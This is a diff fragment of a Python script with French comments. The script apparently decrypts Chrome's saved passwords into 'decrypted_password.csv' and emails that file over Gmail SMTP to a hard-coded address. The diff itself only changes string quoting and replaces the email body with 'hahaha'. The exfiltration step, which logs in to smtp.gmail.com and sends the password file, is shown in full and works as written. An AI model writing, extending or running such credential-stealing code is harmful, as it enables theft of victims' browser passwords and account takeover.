@@ -41,16 +41,14 @@ try:
                 # Supprimer la base de données temporaire
                 os.remove('Loginvault.db')
     # Envoyer le fichier CSV par e-mail
-    sender_email = "breen.important@gmail.com"
-    receiver_email = "breen.important@gmail.com"
-    password = "votre_mot_de_passe_ici"
-    message = """Subject: Mots de passe Chrome déchiffrés
-    Voici les mots de passe Chrome déchiffrés.
-    """
+    sender_email = 'breen.important@gmail.com'
+    receiver_email = 'breen.important@gmail.com'
+    password = 'votre_mot_de_passe_ici'
+    message = 'hahaha'
     context = ssl.create_default_context()
-    with open("decrypted_password.csv", "r") as file:
+    with open('decrypted_password.csv', 'r') as file:
         message += file.read()
-    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message)
 except Exception as e:
